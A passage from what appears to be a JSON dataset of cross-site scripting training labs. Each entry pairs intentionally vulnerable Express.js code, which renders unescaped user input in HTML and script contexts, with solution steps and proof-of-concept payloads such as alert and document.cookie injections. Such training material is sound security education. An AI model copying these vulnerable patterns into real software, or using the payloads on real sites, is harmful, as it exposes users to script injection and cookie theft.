        "Inspect tooltip behavior using developer tools (DOM/JS console).",
        "Confirm use of innerHTML and identify injection point.",
        "Craft payloads that fit inside tooltip container.",
        "Confirm that the payload executes on page load or interaction."
      ],
      "payloads": [
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<script>alert(document.cookie)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const term = req.query.term || ''; res.send(`<html><body><div id='tooltip'></div><script>document.getElementById('tooltip').innerHTML = '${term}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Feedback Form Subject",
      "Lab Description": "The feedback page echoes the submitted subject value back in a confirmation message. It does so by embedding the subject value directly into HTML without escaping. To solve: Inject a payload in the subject input to execute code when the confirmation is rendered.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Access /feedback and fill in the subject field with a payload.",
        "Submit the form and observe confirmation message.",
        "Inspect the rendering and check where subject appears.",
        "Craft a working script-injection payload.",
        "Confirm alert triggers after form submission."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/feedback', (req, res) => { res.send(`<form method='POST'><input name='subject'><button>Send</button></form>`); }); app.post('/feedback', (req, res) => { const subject = req.body.subject; res.send(`<p>Thanks for your feedback on: ${subject}</p>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Forum Post Title",
      "Lab Description": "A forum allows users to post discussion threads. The thread titles are stored and displayed in a list on the homepage. Titles are rendered into the DOM without sanitization. To solve: Submit a new post with an XSS payload in the title and verify that it executes on homepage load.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to /new-thread and submit a title with an XSS payload.",
        "Visit /forum to view all posts.",
        "Inspect rendering of the title in list view.",
        "Try multiple HTML-based payloads.",
        "Verify payload executes on page load."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const posts = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/new-thread', (req, res) => { res.send(`<form method='POST'><input name='title'><button>Create</button></form>`); }); app.post('/new-thread', (req, res) => { posts.push(req.body.title); res.redirect('/forum'); }); app.get('/forum', (req, res) => { const items = posts.map(p => `<li>${p}</li>`).join(''); res.send(`<ul>${items}</ul>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Profile Badge Generator",
      "Lab Description": "The application lets users generate HTML badges for embedding in external blogs. The badge content includes user-provided name and is rendered with innerHTML. To solve: Inject a payload in the name and view the generated badge HTML to trigger execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to /badge and enter a malicious name.",
        "Submit the form to get HTML code preview.",
        "Inspect generated HTML using browser dev tools.",
        "Check for unsanitized rendering via innerHTML.",
        "Confirm execution of injected payload."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('Badge')>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/badge', (req, res) => { res.send(`<form method='POST'><input name='username'><button>Generate</button></form>`); }); app.post('/badge', (req, res) => { const name = req.body.username; res.send(`<div>Your badge:</div><div><code>&lt;div&gt;User: ${name}&lt;/div&gt;</code></div>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS in Hash-Based Routing",
      "Lab Description": "A single-page application reads the hash part of the URL to render navigation state. It updates the DOM using `document.getElementById('view').innerHTML = location.hash`. This leads to DOM-based XSS if the hash includes script or dangerous HTML. To solve: Inject a payload in the URL hash to trigger execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit the application at /#payload to test injection.",
        "Inspect JavaScript that updates the DOM with location.hash.",
        "Use the browser console to confirm how the hash is handled.",
        "Inject payloads like <img> or <script> into the hash.",
        "Verify payload is interpreted and executed by the browser."
      ],
      "payloads": [
        "#<img src=x onerror=alert(1)>",
        "#<svg/onload=alert('XSS')>",
        "#<script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send(`<html><body><div id='view'></div><script>document.getElementById('view').innerHTML = location.hash.substring(1);</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Task Manager Note Field",
      "Lab Description": "The task manager app allows users to add notes to tasks. These notes are stored and later displayed without sanitization in the task detail page using innerHTML. The application directly injects note content into a div. To solve: Inject a script payload into the note field and view the task to trigger execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /task/new and create a task with a malicious note.",
        "Submit a payload in the note field.",
        "Visit /task/view to see task details.",
        "Inspect the DOM for unsafe injection.",
        "Confirm payload executes on task view."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tasks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/task/new', (req, res) => { res.send(`<form method='POST'><input name='note'><button>Create Task</button></form>`); }); app.post('/task/new', (req, res) => { tasks.push(req.body.note); res.redirect('/task/view'); }); app.get('/task/view', (req, res) => { const taskNotes = tasks.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${taskNotes}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS in Email Preview Feature",
      "Lab Description": "An email client renders previews of received emails by injecting subject lines using innerHTML. If the subject includes HTML tags, they are interpreted without sanitization. To solve: Inject a payload into the subject query parameter and confirm execution in the preview.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Access /email/preview?subject= and test with basic HTML.",
        "Inspect the preview rendering logic in DOM.",
        "Identify lack of escaping in innerHTML usage.",
        "Inject payloads with <img> or <svg>.",
        "Confirm execution when preview is rendered."
      ],
      "payloads": [
        "<img src=x onerror=alert('XSS')>",
        "<script>alert(document.domain)</script>",
        "<svg/onload=alert('EmailXSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/email/preview', (req, res) => { const subject = req.query.subject || ''; res.send(`<html><body><div id='subject'></div><script>document.getElementById('subject').innerHTML = '${subject}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Product Search Filter",
      "Lab Description": "The product search page reflects the `category` parameter in a JavaScript variable to customize the UI. The category value is embedded in a script tag via template literal. To solve: Inject a payload that escapes the JS context and triggers script execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to /products?category= and test reflection.",
        "Inspect source for how category is used.",
        "Confirm value is injected in a JS block.",
        "Craft payloads using backticks or quotes.",
        "Verify that payload executes in JS context."
      ],
      "payloads": [
        "`;alert('XSS')//",
        "';alert(1);//",
        "\";alert(document.cookie);//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/products', (req, res) => { const category = req.query.category || 'all'; res.send('<html><head><script>var cat = \"' + category + '\";</script></head><body><h2>Category: ' + category + '</h2></body></html>'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Commenting System",
      "Lab Description": "A commenting system allows users to post comments, which are displayed below blog posts. The content is rendered without sanitization using raw HTML. To solve: Submit a comment with an XSS payload and revisit the blog to observe execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to /blog/1 and post a comment with an XSS payload.",
        "Submit the form and reload the blog page.",
        "Inspect the comment rendering in DOM.",
        "Confirm raw HTML is rendered directly.",
        "Verify that the payload executes when comment is displayed."
      ],
      "payloads": [
        "<script>alert('Comment XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src=javascript:alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/blog/1', (req, res) => { const commentList = comments.map(c => `<p>${c}</p>`).join(''); res.send(`<form method='POST'><input name='comment'><button>Submit</button></form>${commentList}`); }); app.post('/blog/1', (req, res) => { comments.push(req.body.comment); res.redirect('/blog/1'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS via Location Hash in Navigation Tab",
      "Lab Description": "The app reads the URL hash and uses it to dynamically highlight a tab in the navigation bar. The tab name is inserted into the DOM using innerHTML without validation. To solve: Inject a malicious payload in the hash to trigger script execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Visit the application with a crafted hash payload.",
        "Observe how location.hash is handled in script.",
        "Use browser tools to confirm DOM insertion method.",
        "Craft payloads compatible with innerHTML.",
        "Confirm alert triggers from hash injection."
      ],
      "payloads": [
        "#<img src=x onerror=alert(1)>",
        "#<svg/onload=alert('HashXSS')>",
        "#<script>alert('Hash')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send(`<html><body><div id='nav'></div><script>document.getElementById('nav').innerHTML = location.hash.substring(1);</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in User Bio Field on Profile Page",
      "Lab Description": "A user profile page displays the bio field submitted during registration. The content is rendered with innerHTML when another user views the profile. The application stores and reflects this bio without escaping. To solve: Submit a script payload in the bio and visit the profile to trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Register a new user with an XSS payload in the bio.",
        "Log in and navigate to your profile to confirm injection.",
        "View your profile as another user.",
        "Inspect DOM rendering of bio using innerHTML.",
        "Verify that the payload executes."
      ],
      "payloads": [
        "<script>alert('BioXSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); const users = {}; app.use(session({ secret: 'x', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); app.get('/register', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"bio\"><button>Register</button></form>'); }); app.post('/register', (req, res) => { users[req.body.username] = { bio: req.body.bio }; req.session.user = req.body.username; res.redirect('/profile'); }); app.get('/profile', (req, res) => { const user = users[req.session.user]; res.send('<div id=\"bio\"></div><script>document.getElementById(\"bio\").innerHTML = `' + user.bio + '`;</script>'); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS via Search Input Reflection in Script Block",
      "Lab Description": "The search input reflects the user query in a JavaScript variable using template literals. This is vulnerable because the search query is not escaped before being included in a script tag. To solve: Inject a payload that breaks out of the JS context and executes code.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a search request using the `q` parameter.",
        "Inspect source code to see query reflected in JS.",
        "Craft payload with `\"` or backticks to break context.",
        "Trigger payload by visiting crafted URL.",
        "Confirm alert triggers from the JS block."
      ],
      "payloads": [
        "\";alert('XSS')//",
        "`;alert(document.cookie)//",
        "';alert('Injected')//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><script>var searchTerm = \"${q}\";</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Error Message of Password Reset",
      "Lab Description": "The password reset feature reflects the email query parameter in an error message when an invalid email is submitted. The message is rendered via innerHTML in the frontend. To solve: Inject a script in the email parameter and submit it to trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a password reset request with a crafted email.",
        "Inspect the resulting error message in DOM.",
        "Identify lack of escaping when rendering the message.",
        "Inject payload using <img> or <svg>.",
        "Confirm execution of the XSS payload."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert('XSS')</script>",
        "<svg/onload=alert('resetXSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/reset', (req, res) => { const email = req.query.email || ''; res.send(`<html><body><div id='msg'></div><script>document.getElementById('msg').innerHTML = 'No account for ${email}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Feedback Message Panel",
      "Lab Description": "The application allows users to submit feedback that is stored and shown to admins in a panel. The feedback is rendered with raw HTML inside a review box. To solve: Submit a payload as feedback and access the admin panel to trigger XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to /feedback and submit XSS payload.",
        "Access /admin/feedback to view stored feedback.",
        "Confirm payload is rendered using innerHTML.",
        "Trigger XSS by loading the admin panel.",
        "Verify alert or script execution occurs."
      ],
      "payloads": [
        "<script>alert('AdminXSS')</script>",
        "<img src=x onerror=alert('StoredXSS')>",
        "<iframe src=javascript:alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/feedback', (req, res) => { res.send(`<form method='POST'><input name='msg'><button>Send</button></form>`); }); app.post('/feedback', (req, res) => { feedback.push(req.body.msg); res.redirect('/'); }); app.get('/admin/feedback', (req, res) => { const panel = feedback.map(f => `<div>${f}</div>`).join(''); res.send(`<html><body>${panel}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS in Real-Time Chat Name Binding",
      "Lab Description": "The chat app sets a user's name via a query parameter and reflects it in a greeting using innerHTML. If the name contains HTML or scripts, they are rendered without sanitization. To solve: Inject a script in the name parameter to execute code on page load.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Join chat using /chat?name= and observe greeting.",
        "Inspect DOM to confirm innerHTML usage.",
        "Craft payload with <svg> or <img>.",
        "Trigger payload by visiting the crafted URL.",
        "Verify execution of alert or injected code."
      ],
      "payloads": [
        "<svg/onload=alert('ChatXSS')>",
        "<img src=x onerror=alert('Injected')>",
        "<script>alert(document.cookie)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/chat', (req, res) => { const name = req.query.name || 'Guest'; res.send(`<html><body><div id='welcome'></div><script>document.getElementById('welcome').innerHTML = 'Hello, ${name}!';</script></body></html>`); }); app.listen(3000);"
    },
  

    
    {
      "Lab scenario": "XSS via user badge label in gamified profile",
      "Lab Description": "Users can earn badges and customize their labels. These labels are rendered with innerHTML on the profile page. A crafted label can trigger XSS in the profile viewer.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set badge label to <script>alert(1)</script>",
        "Visit profile page",
        "Script executes in badge display area"
      ],
      "payloads": [
        "<script>alert('badgeXSS')</script>",
        "<img src=x onerror=alert('badge')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet badge = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-badge', (req, res) => { badge = req.body.label; res.redirect('/profile'); });\napp.get('/profile', (req, res) => { res.send(`<html><body><span>${badge}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via invoice comment in PDF viewer",
      "Lab Description": "Users can leave comments on invoices, which are rendered in a PDF-like preview using innerHTML. A malicious comment results in XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a comment: <img src=x onerror=alert(1)>",
        "Open the invoice preview",
        "Script executes inside the rendered page"
      ],
      "payloads": [
        "<script>alert('invoiceXSS')</script>",
        "<img src=x onerror=alert('invoice')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet comment = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/comment', (req, res) => { comment = req.body.text; res.redirect('/invoice'); });\napp.get('/invoice', (req, res) => { res.send(`<html><body><div>${comment}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via poll answer option rendering",
      "Lab Description": "Poll creators can define custom answer options. These options are displayed as HTML radio buttons using innerHTML. A crafted option label causes XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create option label: <img src=x onerror=alert(1)>",
        "View the poll as a user",
        "Script executes immediately"
      ],
      "payloads": [
        "<script>alert('pollXSS')</script>",
        "<img src=x onerror=alert('option')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet options = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-option', (req, res) => { options.push(req.body.opt); res.redirect('/poll'); });\napp.get('/poll', (req, res) => { const html = options.map(o => `<label><input type='radio'>${o}</label>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via webhook response rendering",
      "Lab Description": "The admin dashboard logs webhook responses for debugging. If a webhook includes attacker-controlled content, it is rendered via innerHTML.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send webhook with payload in response: <script>alert(1)</script>",
        "Admin opens log viewer",
        "Script executes inside log panel"
      ],
      "payloads": [
        "<script>alert('webhookXSS')</script>",
        "<img src=x onerror=alert('webhook')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet log = '';\napp.use(express.text());\napp.post('/webhook', (req, res) => { log = req.body; res.send('OK'); });\napp.get('/admin/logs', (req, res) => { res.send(`<html><body><div>${log}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via chatroom room name injection",
      "Lab Description": "Users can create chatrooms with custom names. Room names are rendered into the chat interface using innerHTML. A malicious name triggers XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create chatroom named <script>alert(1)</script>",
        "Open the chatroom interface",
        "Script executes in the title bar"
      ],
      "payloads": [
        "<script>alert('chatroomXSS')</script>",
        "<img src=x onerror=alert('room')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet roomName = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-room', (req, res) => { roomName = req.body.name; res.redirect('/room'); });\napp.get('/room', (req, res) => { res.send(`<html><body><h2>${roomName}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via transaction category labels in expense tracker",
      "Lab Description": "The financial tracker allows custom labels for spending categories. These are rendered using innerHTML in charts and summaries.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create category: <img src=x onerror=alert(1)>",
        "View spending summary",
        "Payload triggers in label display"
      ],
      "payloads": [
        "<script>alert('financeXSS')</script>",
        "<img src=x onerror=alert('category')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet categories = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-category', (req, res) => { categories.push(req.body.cat); res.redirect('/summary'); });\napp.get('/summary', (req, res) => { const html = categories.map(c => `<li>${c}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via delivery note comment on order receipt",
      "Lab Description": "The order confirmation page reflects delivery notes added by the customer. These are rendered with innerHTML and may trigger script execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit a note: <script>alert(1)</script>",
        "Load the receipt page",
        "Observe payload in delivery note section"
      ],
      "payloads": [
        "<script>alert('noteXSS')</script>",
        "<img src=x onerror=alert('delivery')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/checkout', (req, res) => { note = req.body.note; res.redirect('/receipt'); });\napp.get('/receipt', (req, res) => { res.send(`<html><body><p>Delivery Note: ${note}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via iframe-embedded error reporting message",
      "Lab Description": "A support widget displays error messages submitted via URL. These are injected into an iframe via srcdoc using user input.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft iframe srcdoc: <iframe srcdoc='<script>alert(1)</script>'>",
        "Load iframe in support chat widget",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('iframeXSS')</script>",
        "<img src=x onerror=alert('srcdoc')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/support', (req, res) => {\n  const msg = req.query.msg || 'All good';\n  res.send(`<html><body><iframe srcdoc=\"${msg}\"></iframe></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via push notification content in preview mode",
      "Lab Description": "Admins can preview a push notification before sending. The content is injected into a simulation UI using innerHTML. XSS is possible via payloads in notification text.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set preview content: <script>alert(1)</script>",
        "Load notification preview interface",
        "Script executes in preview simulator"
      ],
      "payloads": [
        "<script>alert('pushXSS')</script>",
        "<img src=x onerror=alert('notify')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet msg = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/preview-push', (req, res) => { msg = req.body.text; res.redirect('/push-ui'); });\napp.get('/push-ui', (req, res) => { res.send(`<html><body><div>${msg}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via leaderboard player alias",
      "Lab Description": "Player aliases are shown on leaderboards and profile pages. When displayed using innerHTML, a crafted alias can lead to script execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Set alias to <script>alert(1)</script>",
        "Visit leaderboard page",
        "Observe script execution in player slot"
      ],
      "payloads": [
        "<script>alert('aliasXSS')</script>",
        "<img src=x onerror=alert('alias')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet alias = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-alias', (req, res) => { alias = req.body.alias; res.redirect('/leaderboard'); });\napp.get('/leaderboard', (req, res) => { res.send(`<html><body><h3>${alias}</h3></body></html>`); });\napp.listen(3000);"
    },
   {
      "Lab scenario": "XSS via dynamic tab title in workspace manager",
      "Lab Description": "Each user workspace tab allows setting a custom title. The title is rendered in the UI using innerHTML. Injecting a script into the title triggers XSS upon switching tabs.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a tab with title <script>alert(1)</script>",
        "Switch to that tab in the workspace view",
        "Script executes in the header"
      ],
      "payloads": [
        "<script>alert('tabTitleXSS')</script>",
        "<img src=x onerror=alert('tabTitle')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tabTitle = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-tab', (req, res) => { tabTitle = req.body.title; res.redirect('/workspace'); });\napp.get('/workspace', (req, res) => { res.send(`<html><body><div class='tab'>${tabTitle}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via voice assistant command history log",
      "Lab Description": "The app logs all user-issued voice commands. These commands are displayed via innerHTML in a console view. Injecting HTML into a command triggers XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Issue a command like <img src=x onerror=alert(1)> via voice interface",
        "Open command history",
        "Payload executes inside the console"
      ],
      "payloads": [
        "<script>alert('voiceLogXSS')</script>",
        "<img src=x onerror=alert('voice')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet logs = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/log-command', (req, res) => { logs.push(req.body.cmd); res.redirect('/history'); });\napp.get('/history', (req, res) => { const html = logs.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via timeline entry in project journal",
      "Lab Description": "The journal logs project updates as timeline entries. Each entry is displayed using innerHTML. A crafted entry leads to script injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add journal entry: <script>alert(1)</script>",
        "Open the timeline view",
        "Payload executes immediately"
      ],
      "payloads": [
        "<script>alert('timelineLogXSS')</script>",
        "<img src=x onerror=alert('journal')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet timeline = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-entry', (req, res) => { timeline.push(req.body.entry); res.redirect('/timeline'); });\napp.get('/timeline', (req, res) => { const html = timeline.map(e => `<div>${e}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via search history tag cloud",
      "Lab Description": "The app builds a visual tag cloud from users' past search terms. Terms are rendered via innerHTML. Injected HTML in a search term executes code on render.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Search for <img src=x onerror=alert(1)>",
        "View the tag cloud",
        "Script executes immediately"
      ],
      "payloads": [
        "<img src=x onerror=alert('tagCloud')>",
        "<script>alert('searchTagXSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/search', (req, res) => { tags.push(req.body.query); res.redirect('/cloud'); });\napp.get('/cloud', (req, res) => { const html = tags.map(t => `<span>${t}</span>`).join(' '); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom error message in form validation override",
      "Lab Description": "Admins can define custom error messages for failed validations. These are rendered via innerHTML in form fields. Malicious input causes script execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Set custom message to <script>alert(1)</script>",
        "Trigger validation failure",
        "Payload executes inside the error box"
      ],
      "payloads": [
        "<script>alert('formErrorXSS')</script>",
        "<img src=x onerror=alert('errorBox')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet errMsg = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-error', (req, res) => { errMsg = req.body.msg; res.redirect('/form'); });\napp.get('/form', (req, res) => { res.send(`<html><body><form><input type='text'><div>${errMsg}</div></form></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via blog post tag rendering",
      "Lab Description": "The blog platform allows users to assign custom tags to posts. These tags are rendered using innerHTML. A malicious tag can trigger XSS when viewed on the blog post page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a tag with content: <img src=x onerror=alert(1)>",
        "Assign it to a post",
        "View the blog post and observe script execution"
      ],
      "payloads": [
        "<img src=x onerror=alert('tagXSS')>",
        "<script>alert('blog')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-tag', (req, res) => { tags.push(req.body.tag); res.redirect('/post'); });\napp.get('/post', (req, res) => { const html = tags.map(t => `<span>${t}</span>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via RSS feed item title injection",
      "Lab Description": "The application displays titles from external RSS feeds. If an attacker controls a feed item title and it is rendered via innerHTML, XSS is possible.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Host RSS with <title><script>alert(1)</script></title>",
        "Add feed to dashboard",
        "Script executes when feed loads"
      ],
      "payloads": [
        "<script>alert('rssXSS')</script>",
        "<img src=x onerror=alert('rss')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet feedTitle = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/import-feed', (req, res) => { feedTitle = req.body.title; res.redirect('/feeds'); });\napp.get('/feeds', (req, res) => { res.send(`<html><body><h2>${feedTitle}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic avatar tooltip description",
      "Lab Description": "The app shows a tooltip with user bio when hovering over avatars. Bios are inserted into the tooltip container using innerHTML. A malicious bio can trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set your bio to <img src=x onerror=alert(1)>",
        "Hover over your avatar",
        "Observe script execution in tooltip"
      ],
      "payloads": [
        "<img src=x onerror=alert('tooltipXSS')>",
        "<script>alert('bio')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet bio = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-bio', (req, res) => { bio = req.body.bio; res.redirect('/avatar'); });\napp.get('/avatar', (req, res) => { res.send(`<html><body><div title='${bio}'><img src='avatar.png'></div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via autocomplete address suggestions",
      "Lab Description": "The checkout form provides address suggestions based on previous inputs. These are rendered using innerHTML in a datalist. A malicious address triggers XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit address: <img src=x onerror=alert(1)>",
        "Reopen the form to see suggestions",
        "Payload executes in datalist"
      ],
      "payloads": [
        "<script>alert('addressXSS')</script>",
        "<img src=x onerror=alert('auto')>"
      ],
      "Vulnerability name": "Cross-site scripting",
